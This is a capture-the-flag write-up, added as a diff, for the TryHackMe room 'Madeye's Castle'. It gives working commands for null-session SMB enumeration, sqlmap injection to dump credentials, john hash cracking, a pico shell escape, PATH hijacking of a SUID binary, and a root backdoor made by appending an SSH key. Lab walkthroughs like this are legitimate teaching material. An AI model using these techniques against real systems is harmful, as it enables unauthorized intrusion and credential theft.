@@ -1,0 +1,143 @@
+<p>Link to the ctf: <a href="https://tryhackme.com/room/madeyescastle">Madeye’s Castle</a></p>
+
+<h1 id="web-server">Web Server</h1>
+<p>By visiting the webpage, we see that the default apache page is changed.</p>
+
+<p><img src="/assets/Clipboard_2021-02-19-09-14-44.png" alt="" /></p>
+
+<p>by checking the source code, we get an hint.</p>
+
+<p><img src="/assets/Clipboard_2021-02-19-09-14-01.png" alt="" /></p>
+
+<p>Updating the <code class="highlighter-rouge">/etc/hosts</code> file we get another webpage that greetes us.</p>
+
+<p><img src="/assets/Clipboard_2021-02-19-09-15-53.png" alt="" /></p>
+
+<h2 id="smb-share">SMB Share</h2>
+
+<p>nmap tells us that there’s a Samba service on.
+<img src="/assets/Clipboard_2021-02-19-09-18-10.png" alt="" /></p>
+
+<p>I’m gonna use <a href="https://github.com/cddmp/enum4linux-ng">enum4linux-ng</a>.</p>
+
+<p>The following interesting things that the output it gives us are the following:</p>
+
+<p><img src="/assets/Clipboard_2021-02-19-09-22-04.png" alt="" />
+There is a Null Session vulnerability. This allows us to “login” without entering a password.</p>
+
+<p>I then used <code class="highlighter-rouge">smbmap</code> to enumerate it further.</p>
+<div class="language-bash highlighter-rouge"><pre class="codehilite"><code>smbmap -H 10.10.197.154 -u <span class="s1">''</span> -p <span class="s1">''</span> 
+</code></pre></div>
+<p><img src="/assets/Clipboard_2021-02-19-09-25-29.png" alt="" /></p>
+
+<p><code class="highlighter-rouge">sambashare</code> is accessible. The following command is to recursively search for stuff inside a share.</p>
+<div class="language-bash highlighter-rouge"><pre class="codehilite"><code>smbmap -H 10.10.197.154 -u <span class="s1">''</span> -p <span class="s1">''</span> -R sambashare
+</code></pre></div>
+
+<p><img src="/assets/Clipboard_2021-02-19-09-27-10.png" alt="" /></p>
+
+<p>To download the files, we just use the <code class="highlighter-rouge">--download</code> argument</p>
+<div class="language-bash highlighter-rouge"><pre class="codehilite"><code>smbmap -H 10.10.197.154 -u <span class="s1">''</span> -p <span class="s1">''</span> --download sambashare<span class="se">\\</span>.notes.txt
+smbmap -H 10.10.197.154 -u <span class="s1">''</span> -p <span class="s1">''</span> --download sambashare<span class="se">\\</span>spellnames.txt
+</code></pre></div>
+
+<p><code class="highlighter-rouge">notes.txt</code> contains the following:</p>
+<div class="highlighter-rouge"><pre class="codehilite"><code>Hagrid told me that spells names are not good since they will not "rock you"
+Hermonine loves historical text editors along with reading old books.
+</code></pre></div>
+
+<p>and <code class="highlighter-rouge">spellnames.txt</code> it apper to be a wordlist.</p>
+
+<h2 id="sql-injection">SQL Injection</h2>
+<p>I intercepted the login request and passed it to sqlmap
+I’m using the following sqlmap version: <code class="highlighter-rouge">1.5.2#pip</code></p>
+<blockquote>
+  <p>Fun fact: I had issue with sqlmap. Try to update it or change some arguments.</p>
+  <div class="language-bash highlighter-rouge"><pre class="codehilite"><code>sqlmap -r request --level 5 --risk 3 --random-agent -T users --dump
+</code></pre>  </div>
+</blockquote>
+
+<p><img src="/assets/Clipboard_2021-02-19-09-04-47.png" alt="" /></p>
+
+<p>I decided to crack this hash since it gives me more detail about it
+“My linux username is my first name, and password uses best64”
+so harry is the username, <code class="highlighter-rouge">best64</code> is a rule. I use john to crack the hash.</p>
+
+<div class="language-bash highlighter-rouge"><pre class="codehilite"><code>john --rules<span class="o">=</span>best64 -w<span class="o">=</span>./spellnames.txt --format<span class="o">=</span>Raw-SHA512 hash.txt
+</code></pre></div>
+
+<p><img src="/assets/Clipboard_2021-02-19-09-34-59.png" alt="" /></p>
+
+<p>We can use the credentials to log in via ssh.</p>
+
+<h2 id="horizontal-privilege-escalation">Horizontal Privilege Escalation</h2>
+<p>By checking <code class="highlighter-rouge">harry</code> privileges, we see that we can execute <code class="highlighter-rouge">pico</code> as <code class="highlighter-rouge">hermonine</code>
+<img src="/assets/Clipboard_2021-02-19-09-36-41.png" alt="" />
+By using <a href="https://gtfobins.github.io/gtfobins/pico/">Pico privesc techninques</a> we can spawn a shell as <code class="highlighter-rouge">hermonine</code>.</p>
+
+<p>And then I put my ssh-key in <code class="highlighter-rouge">/home/hermonine/.ssh/authorized_keys</code> so I can have a better shell.</p>
+
+<h2 id="vertical-privilege-escalation">Vertical privilege escalation</h2>
+<p>Got stuck here, thinking that I should do something that only hermonine could do.</p>
+
+<p>I checked for SUID files</p>
+
+<p><img src="/assets/Clipboard_2021-02-19-09-51-22.png" alt="" /></p>
+
+<p>I used the <code class="highlighter-rouge">strings</code> command</p>
+
+<p><img src="/assets/Clipboard_2021-02-19-09-52-00.png" alt="" /></p>
+
+<p>and I feel like this binary executes <code class="highlighter-rouge">uname -p</code> without specifying the full path for it. 
+We can exploit it by just changing the enviroment path where Linux checks for binaries.</p>
+
+<p><img src="/assets/Clipboard_2021-02-19-09-54-31.png" alt="" /></p>
+
+<p>By runnin these commands, we tell linux to check first in our current directory for the linux command that it has to execute.
+Then I create a bash script called <code class="highlighter-rouge">uname</code></p>
+<div class="language-bash highlighter-rouge"><pre class="codehilite"><code><span class="c">#!/bin/bash</span>
+<span class="nb">echo</span> <span class="s2">"HIJACKED"</span>;
+whoami; id;
+</code></pre></div>
+<p>and make it executable</p>
+<div class="language-bash highlighter-rouge"><pre class="codehilite"><code>chmod +x uname
+</code></pre></div>
+
+<p>but first we have to guess the number.
+We can actually bypass it since it uses the current time as seed.</p>
+<div class="language-c highlighter-rouge"><pre class="codehilite"><code><span class="cp">#include &lt;stdio.h&gt;
+#include &lt;time.h&gt;
+</span>
+<span class="kt">int</span> <span class="n">main</span><span class="p">(){</span>
+	<span class="n">srand</span><span class="p">(</span><span class="n">time</span><span class="p">(</span><span class="mi">0</span><span class="p">));</span>
+	<span class="n">printf</span><span class="p">(</span><span class="s">"%d"</span><span class="p">,</span> <span class="n">rand</span><span class="p">());</span>
+	<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div>
+<p>and compile it</p>
+
+<div class="language-bash highlighter-rouge"><pre class="codehilite"><code>gcc rand.c
+</code></pre></div>
+
+<p><img src="/assets/Clipboard_2021-02-19-10-03-35.png" alt="" /></p>
+
+<p>okay, so we can confirm that we can execute commands as root.
+The easiest way to get root would be to change <code class="highlighter-rouge">/bin/bash</code>’s suid.
+Or we can write our key to <code class="highlighter-rouge">/root/.ssh/authorided_keys</code>.</p>
+
+<p>I’m treating this as a penetration test, so I’d like to not mess things around more than I should, so I’ll write my ssh key being careful to <strong>append</strong> it to the file.</p>
+
+<div class="language-bash highlighter-rouge"><pre class="codehilite"><code><span class="c">#!/bin/bash</span>
+<span class="nb">echo</span> <span class="s2">"HIJACKED"</span>;
+mkdir /root/.ssh; chmod 600 /root/.ssh;
+<span class="nb">echo</span> -e <span class="s1">'\necdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBFHMnWdBAAvTFNf4U01x9NjPFAbGWj4f/LyeCZPmHQdp/PH/u71OShS7wZREW9WzV73/TGxuwXYnaU1RJL/5wJc= lmao'</span> &gt;&gt; /root/.ssh/authorized_keys
+cat /root/.ssh/authorized_keys
+</code></pre></div>
+
+<p>Now we can login as root via ssh.</p>
+
+<div class="language-bash highlighter-rouge"><pre class="codehilite"><code>ssh -i sshkey root@10.10.197.154
+</code></pre></div>
+
+<p><img src="/assets/Clipboard_2021-02-19-10-11-16.png" alt="" /></p>
+
